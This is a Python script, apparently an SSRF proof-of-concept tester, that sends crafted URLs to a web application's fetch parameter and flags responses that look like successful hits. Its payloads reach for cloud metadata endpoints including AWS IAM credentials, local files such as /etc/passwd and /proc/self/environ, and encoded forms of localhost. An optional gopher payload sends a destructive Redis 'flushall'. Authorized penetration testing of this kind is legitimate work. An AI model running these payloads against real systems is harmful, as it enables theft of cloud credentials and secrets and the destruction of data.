#!/usr/bin/env python3
"""
Basic but more realistic SSRF / URL-fetching vulnerability tester
Not a full scanner - more like enhanced PoC / starting point for custom testing
"""

import requests
import urllib.parse
import time
import json
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass


@dataclass
class SSRFResult:
    payload: str
    method: str
    status_code: int
    response_size: int
    detection_type: str           # reflected / timing / dns / oob
    confidence: str               # low / medium / high
    evidence: str                 # short description or snippet
    interesting: bool = False


class SSRFTester:
    def __init__(
        self,
        base_url: str,
        param_name: str = "url",
        method: str = "GET",
        headers: Optional[Dict] = None,
        cookies: Optional[Dict] = None,
        json_body: bool = False,
        timeout: float = 7.0,
        verify_ssl: bool = False,          # often helps with internal self-signed certs
        max_redirects: int = 5,
        delay_between_requests: float = 0.4
    ):
        self.base_url = base_url
        self.param_name = param_name
        self.method = method.upper()
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.session.max_redirects = max_redirects

        if headers:
            self.session.headers.update(headers)
        if cookies:
            self.session.cookies.update(cookies)

        self.json_body = json_body
        self.timeout = timeout
        self.delay = delay_between_requests

        self.results: List[SSRFResult] = []
        self.interesting_results: List[SSRFResult] = []

    def log(self, msg: str, level: str = "INFO"):
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{ts}] [{level}] {msg}")

    def _make_request(self, value: str) -> Tuple[bool, Optional[requests.Response], str]:
        try:
            if self.json_body:
                data = {self.param_name: value}
                r = self.session.request(
                    self.method,
                    self.base_url,
                    json=data,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                params = {self.param_name: value} if self.method == "GET" else None
                data = {self.param_name: value} if self.method in ("POST", "PUT", "PATCH") else None

                r = self.session.request(
                    self.method,
                    self.base_url,
                    params=params,
                    data=data,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            return True, r, ""
        except (requests.Timeout, requests.ConnectionError, requests.TooManyRedirects) as e:
            return False, None, str(e)
        except Exception as e:
            return False, None, str(e)

    def run_tests(self, aggressive: bool = False):
        self.log(f"Starting SSRF tests against: {self.base_url}")
        self.log(f"Method: {self.method} | Param: {self.param_name} | JSON: {self.json_body}")

        payloads = self._build_payloads(aggressive)

        baseline_time = None
        baseline_resp = None

        # Get baseline timing/response
        self.log("Measuring baseline response...")
        ok, baseline_resp, err = self._make_request("https://example.com")
        if ok and baseline_resp is not None:
            baseline_time = baseline_resp.elapsed.total_seconds()
            self.log(f"Baseline time: {baseline_time:.2f}s  size: {len(baseline_resp.content)} bytes")
        else:
            self.log(f"Baseline request failed: {err}", "WARNING")

        for payload in payloads:
            time.sleep(self.delay)

            start = time.time()
            success, resp, error = self._make_request(payload.raw)

            if not success:
                self.results.append(SSRFResult(
                    payload=payload.raw,
                    method=self.method,
                    status_code=0,
                    response_size=0,
                    detection_type="error",
                    confidence="low",
                    evidence=f"Request error: {error}",
                    interesting=False
                ))
                continue

            elapsed = time.time() - start
            size = len(resp.content) if resp.content else 0

            result = SSRFResult(
                payload=payload.raw,
                method=self.method,
                status_code=resp.status_code,
                response_size=size,
                detection_type="unknown",
                confidence="low",
                evidence="",
                interesting=False
            )

            # === Detection heuristics ===
            if payload.kind == "metadata" and "ami-id" in resp.text.lower():
                result.detection_type = "reflected"
                result.confidence = "high"
                result.evidence = "AWS metadata found"
                result.interesting = True

            elif payload.kind == "file" and ("root:" in resp.text or "bin/" in resp.text):
                result.detection_type = "reflected"
                result.confidence = "high"
                result.evidence = "Looks like /etc/passwd or similar"
                result.interesting = True

            elif payload.kind == "timing" and baseline_time:
                if elapsed > baseline_time + 3.0:  # quite big difference
                    result.detection_type = "timing"
                    result.confidence = "medium"
                    result.evidence = f"Δt = {elapsed-baseline_time:.2f}s"
                    result.interesting = True

            elif payload.kind in ("internal", "cloud"):
                if resp.status_code in (200, 301, 302, 307) and size > 10:
                    result.detection_type = "status+size"
                    result.confidence = "medium"
                    result.evidence = f"{resp.status_code} + {size} bytes"
                    result.interesting = True

            self.results.append(result)
            if result.interesting:
                self.interesting_results.append(result)
                self.log(f"[!] Interesting: {payload.description}", "WARNING")

        self._print_summary()

    def _build_payloads(self, aggressive: bool = False) -> List[object]:
        class P:
            def __init__(self, raw: str, kind: str, description: str):
                self.raw = raw
                self.kind = kind
                self.description = description

        basic = [
            P("http://127.0.0.1",                "internal", "classic localhost"),
            P("http://[::1]",                    "internal", "IPv6 localhost"),
            P("http://2130706433",               "internal", "decimal localhost"),
            P("http://0177.0.0.1",               "internal", "octal localhost"),
            P("http://169.254.169.254/latest/meta-data/", "metadata", "AWS classic metadata"),
            P("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "metadata", "AWS IAM"),
            P("http://metadata.google.internal/computeMetadata/v1/", "metadata", "GCP metadata"),
            P("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "metadata", "Azure metadata"),
            P("file:///etc/passwd",              "file",     "local file classic"),
            P("file:///proc/self/environ",       "file",     "environment variables"),
        ]

        extra = [
            P("http://localhost:6379/info",      "internal", "redis"),
            P("http://localhost:9200/_cat/indices", "internal", "elasticsearch"),
            P("gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A", "gopher", "redis gopher flush"),
            P("dict://127.0.0.1:6379/info",      "dict",    "redis via dict"),
        ]

        return basic + (extra if aggressive else [])

    def _print_summary(self):
        self.log(f"\n{'='*70}")
        self.log(f"SSRF Test Summary – {len(self.results)} payloads tested")
        self.log(f"Interesting findings: {len(self.interesting_results)}")
        self.log(f"{'='*70}\n")

        for r in self.interesting_results:
            print(f"CONFIDENCE: {r.confidence.upper()}")
            print(f"TYPE:       {r.detection_type}")
            print(f"PAYLOAD:    {r.payload}")
            print(f"STATUS:     {r.status_code}")
            print(f"SIZE:       {r.response_size} bytes")
            print(f"EVIDENCE:   {r.evidence}")
            print("-"*60)


# Example usage
if __name__ == "__main__":
    tester = SSRFTester(
        base_url="http://example.com/api/fetch",
        param_name="target",
        method="POST",
        json_body=True,
        headers={"Authorization": "Bearer changeme"},
        timeout=8.0,
        delay_between_requests=0.6
    )

    tester.run_tests(aggressive=False)
